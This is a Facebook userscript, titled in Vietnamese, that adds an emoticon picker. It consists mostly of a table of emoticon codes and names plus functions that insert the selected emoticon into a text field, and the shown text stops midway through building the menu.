// ==UserScript==
// @name            Đổi tên lần 6 cho FACEBOOK (y)
// @description     All about facebook By Noname
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "Gru?ƒÂ±?ƒÂ³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "Ping?ƒÂ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
